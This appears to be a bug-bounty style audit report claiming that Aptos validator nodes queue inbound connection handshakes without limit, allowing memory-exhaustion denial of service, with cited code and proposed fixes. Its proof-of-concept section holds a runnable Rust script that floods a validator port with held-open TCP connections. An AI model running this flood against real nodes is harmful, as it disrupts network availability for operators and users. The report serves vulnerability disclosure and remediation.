# Audit Report

## Title
Unbounded Connection Upgrade Queue Enables Memory Exhaustion DoS on Validator Nodes

## Summary
The network transport layer accepts and processes incoming connections without enforcing backpressure on pending connection upgrades. An attacker can flood a validator node with TCP connections, causing all of them to undergo expensive cryptographic handshakes simultaneously, leading to unbounded memory growth and potential node crashes that affect network availability.

## Finding Description

The vulnerability exists in the connection handling pipeline where inbound connections are processed. The critical flaw is that **connection limit enforcement happens after expensive upgrade operations complete**, rather than before accepting connections or during the upgrade process.

The attack flow proceeds as follows:

1. **TCP Connection Acceptance**: The TCP transport accepts incoming connections with a backlog of 256. [1](#0-0) 

2. **Immediate Stream Emission**: The `TcpListenerStream` immediately yields accepted connections without any rate limiting or backpressure mechanism. [2](#0-1) 

3. **Unbounded Upgrade Queue**: The `TransportHandler` maintains an unbounded `FuturesUnordered` collection for pending inbound connection upgrades. [3](#0-2) 

4. **No Backpressure in Listen Loop**: When the listener yields a new connection, it immediately creates an upgrade future and pushes it to the unbounded collection without checking capacity limits. [4](#0-3) 

5. **Expensive Upgrade Process**: Each upgrade involves cryptographically intensive operations including Noise handshakes, authentication checks, and protocol negotiations - operations that consume significant CPU and memory resources.

6. **Late Limit Enforcement**: The connection limit is only checked **after** the upgrade completes and the connection reaches the `PeerManager`, where it counts existing connections and rejects excess ones. [5](#0-4) 

The core issue is that the boxed transport implementation provides no backpressure mechanism. [6](#0-5)  The listener stream is simply wrapped and boxed without any capacity control, allowing unlimited concurrent upgrades.

**Attack Scenario:**

An attacker opens thousands of simultaneous TCP connections to a validator node. Each connection:
- Is immediately accepted by the TCP listener
- Has an upgrade future created and pushed to `pending_inbound_connections`
- Begins expensive Noise handshake operations
- Consumes memory for connection state, cryptographic contexts, and pending future storage

Since `FuturesUnordered` has no capacity limit, all these upgrade futures accumulate simultaneously. The memory footprint grows linearly with the number of attacking connections. Once memory is exhausted, the validator node crashes or becomes unresponsive, affecting network availability.

Critically, the codebase contains a bounded implementation `FuturesUnorderedX` with explicit `max_in_progress` capacity control [7](#0-6) , but this is **not used** in the transport handler, demonstrating that the developers were aware of the need for bounded concurrency in other parts of the system.

## Impact Explanation

This vulnerability meets **High Severity** criteria per the Aptos bug bounty program:

- **Validator node slowdowns**: During an attack, nodes experience severe performance degradation due to resource exhaustion
- **Network availability impact**: Crashed or unresponsive validator nodes reduce the number of active validators, potentially affecting consensus participation and block production
- **API crashes**: The memory exhaustion can cause the entire node process to crash, not just network components

The impact is compounded because:
1. Validators are publicly accessible and must accept inbound connections
2. No authentication is required before the expensive upgrade begins
3. The attack can be sustained cheaply by an attacker (just opening TCP connections)
4. Multiple validators can be targeted simultaneously to maximize network disruption

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits" - the network layer fails to limit computational resources (CPU for crypto operations) and memory resources (upgrade future storage).

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **Low attacker complexity**: Opening many TCP connections requires minimal resources and can be automated with simple scripts or standard DoS tools
2. **No authentication barrier**: The attack begins before any authentication or authorization checks occur
3. **Publicly accessible targets**: Validator nodes must accept inbound connections from unknown peers for network connectivity
4. **Easily discoverable**: Validator endpoints are often publicly known or discoverable through network topology
5. **Immediate impact**: The attack causes immediate resource consumption without complex exploitation chains

The metric `pending_connection_upgrades` already exists to track concurrent upgrades [8](#0-7) , suggesting the system is instrumented to observe this attack vector.

## Recommendation

Implement backpressure by limiting concurrent pending upgrades using the existing `FuturesUnorderedX` implementation or a similar bounded approach:

**Option 1: Use FuturesUnorderedX with Capacity Limit**

Replace the unbounded `FuturesUnordered` with `FuturesUnorderedX` in `TransportHandler::listen()`:

```rust
// Add to network/framework/src/peer_manager/transport.rs
use aptos_backup_cli::utils::stream::FuturesUnorderedX;

pub async fn listen(mut self) {
    // Define maximum concurrent inbound upgrades (e.g., 2x the max_inbound_connections)
    let max_concurrent_upgrades = 200; 
    let mut pending_inbound_connections = FuturesUnorderedX::new(max_concurrent_upgrades);
    let mut pending_outbound_connections = FuturesUnordered::new();
    // ... rest of implementation
}
```

**Option 2: Early Connection Limit Check**

Add a counter-based check before creating upgrade futures:

```rust
// In TransportHandler
struct TransportHandler<TTransport, TSocket> {
    // ... existing fields
    pending_inbound_count: Arc<AtomicUsize>,
    max_pending_inbound: usize,
}

// In listen() loop, before upgrade_inbound_connection:
if self.pending_inbound_count.load(Ordering::Relaxed) >= self.max_pending_inbound {
    // Reject connection immediately without expensive upgrade
    debug!("Rejecting inbound connection: pending upgrade limit reached");
    continue;
}
```

**Option 3: Semaphore-Based Rate Limiting**

Use a semaphore to limit concurrent upgrades:

```rust
use tokio::sync::Semaphore;

let upgrade_semaphore = Arc::new(Semaphore::new(200));

// Before upgrade:
let permit = upgrade_semaphore.clone().try_acquire_owned();
if permit.is_err() {
    // Reject connection
    continue;
}
// Pass permit to upgrade future to release when done
```

The most robust solution is **Option 1** as it reuses existing tested code and provides natural backpressure through queuing rather than rejection.

## Proof of Concept

```rust
// DoS attack simulation
// File: network_dos_poc.rs

use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

#[tokio::main]
async fn main() {
    let target = "127.0.0.1:6180"; // Validator network port
    let connection_count = Arc::new(AtomicUsize::new(0));
    let mut handles = vec![];
    
    println!("Starting DoS attack on {}", target);
    println!("Opening 1000 simultaneous connections...");
    
    for i in 0..1000 {
        let target = target.to_string();
        let counter = connection_count.clone();
        
        let handle = tokio::spawn(async move {
            match TcpStream::connect(&target).await {
                Ok(mut stream) => {
                    let count = counter.fetch_add(1, Ordering::Relaxed);
                    if count % 100 == 0 {
                        println!("Opened {} connections", count);
                    }
                    // Keep connection alive but don't complete handshake
                    // This forces the validator to keep upgrade future in memory
                    sleep(Duration::from_secs(300)).await;
                    drop(stream);
                }
                Err(e) => {
                    eprintln!("Connection {} failed: {}", i, e);
                }
            }
        });
        
        handles.push(handle);
        
        // Small delay to avoid overwhelming local resources
        if i % 10 == 0 {
            sleep(Duration::from_millis(10)).await;
        }
    }
    
    println!("All connections initiated. Monitoring validator memory usage...");
    println!("Expected: Validator memory grows unbounded");
    println!("Expected: Validator may crash with OOM");
    
    for handle in handles {
        let _ = handle.await;
    }
}
```

**Validation Steps:**
1. Start an Aptos validator node with default network configuration
2. Monitor the `aptos_network_pending_connection_upgrades` metric
3. Run the PoC to open 1000+ simultaneous connections
4. Observe: Metric increases without bound, memory usage grows, node may become unresponsive
5. Check: `FuturesUnordered` in `pending_inbound_connections` grows unbounded until memory exhaustion

## Notes

The vulnerability specifically affects the network transport layer's handling of inbound connections. While there is a configuration parameter `max_inbound_connections` [9](#0-8)  and the `PeerManager` enforces this limit [10](#0-9) , this enforcement occurs **after** expensive upgrade operations complete, making it ineffective against this attack.

The existence of `FuturesUnorderedX` in the codebase demonstrates that bounded concurrency is a known pattern in this codebase, yet it was not applied to the critical connection handling path where it is most needed for security.

### Citations

**File:** network/netcore/src/transport/tcp.rs (L127-127)
```rust
        let listener = socket.listen(256)?;
```

**File:** network/netcore/src/transport/tcp.rs (L319-334)
```rust
    fn poll_next(self: Pin<&mut Self>, context: &mut Context) -> Poll<Option<Self::Item>> {
        match self.inner.poll_accept(context) {
            Poll::Ready(Ok((socket, addr))) => {
                if let Err(e) = self.config.apply_config(&socket) {
                    return Poll::Ready(Some(Err(e)));
                }
                let dialer_addr = NetworkAddress::from(addr);
                Poll::Ready(Some(Ok((
                    future::ready(Ok(TcpSocket::new(socket))),
                    dialer_addr,
                ))))
            },
            Poll::Ready(Err(e)) => Poll::Ready(Some(Err(e))),
            Poll::Pending => Poll::Pending,
        }
    }
```

**File:** network/framework/src/peer_manager/transport.rs (L91-91)
```rust
        let mut pending_inbound_connections = FuturesUnordered::new();
```

**File:** network/framework/src/peer_manager/transport.rs (L106-109)
```rust
                inbound_connection = self.listener.select_next_some() => {
                    if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                        pending_inbound_connections.push(fut);
                    }
```

**File:** network/framework/src/peer_manager/transport.rs (L148-152)
```rust
                counters::pending_connection_upgrades(
                    &self.network_context,
                    ConnectionOrigin::Inbound,
                )
                .inc();
```

**File:** network/framework/src/peer_manager/mod.rs (L118-118)
```rust
    inbound_connection_limit: usize,
```

**File:** network/framework/src/peer_manager/mod.rs (L351-390)
```rust
        // Verify that we have not reached the max connection limit for unknown inbound peers
        if conn.metadata.origin == ConnectionOrigin::Inbound {
            // Everything below here is meant for unknown peers only. The role comes from
            // the Noise handshake and if it's not `Unknown` then it is trusted.
            if conn.metadata.role == PeerRole::Unknown {
                // TODO: Keep track of somewhere else to not take this hit in case of DDoS
                // Count unknown inbound connections
                let unknown_inbound_conns = self
                    .active_peers
                    .iter()
                    .filter(|(peer_id, (metadata, _))| {
                        metadata.origin == ConnectionOrigin::Inbound
                            && trusted_peers
                                .get(peer_id)
                                .is_none_or(|peer| peer.role == PeerRole::Unknown)
                    })
                    .count();

                // Reject excessive inbound connections made by unknown peers
                // We control outbound connections with Connectivity manager before we even send them
                // and we must allow connections that already exist to pass through tie breaking.
                if !self
                    .active_peers
                    .contains_key(&conn.metadata.remote_peer_id)
                    && unknown_inbound_conns + 1 > self.inbound_connection_limit
                {
                    info!(
                        NetworkSchema::new(&self.network_context)
                            .connection_metadata_with_address(&conn.metadata),
                        "{} Connection rejected due to connection limit: {}",
                        self.network_context,
                        conn.metadata
                    );
                    counters::connections_rejected(&self.network_context, conn.metadata.origin)
                        .inc();
                    self.disconnect(conn);
                    return;
                }
            }
        }
```

**File:** network/netcore/src/transport/boxed.rs (L30-35)
```rust
    fn listen_on(&self, addr: NetworkAddress) -> Result<(Listener<O, E>, NetworkAddress), E> {
        let (listener, addr) = self.listen_on(addr)?;
        let listener = listener
            .map(|result| result.map(|(incoming, addr)| (incoming.boxed() as Inbound<O, E>, addr)));
        Ok((listener.boxed() as Listener<O, E>, addr))
    }
```

**File:** storage/backup/backup-cli/src/utils/stream/futures_unordered_x.rs (L15-36)
```rust
pub struct FuturesUnorderedX<T: Future> {
    queued: VecDeque<T>,
    in_progress: FuturesUnordered<T>,
    queued_outputs: VecDeque<T::Output>,
    max_in_progress: usize,
}

impl<T: Future> Unpin for FuturesUnorderedX<T> {}

impl<Fut: Future> FuturesUnorderedX<Fut> {
    /// Constructs a new, empty `FuturesOrderedX`
    ///
    /// The returned `FuturesOrderedX` does not contain any futures and, in this
    /// state, `FuturesOrdered::poll_next` will return `Poll::Ready(None)`.
    pub fn new(max_in_progress: usize) -> FuturesUnorderedX<Fut> {
        assert!(max_in_progress > 0);
        FuturesUnorderedX {
            queued: VecDeque::new(),
            in_progress: FuturesUnordered::new(),
            queued_outputs: VecDeque::new(),
            max_in_progress,
        }
```

**File:** config/src/config/network_config.rs (L44-44)
```rust
pub const MAX_INBOUND_CONNECTIONS: usize = 100;
```
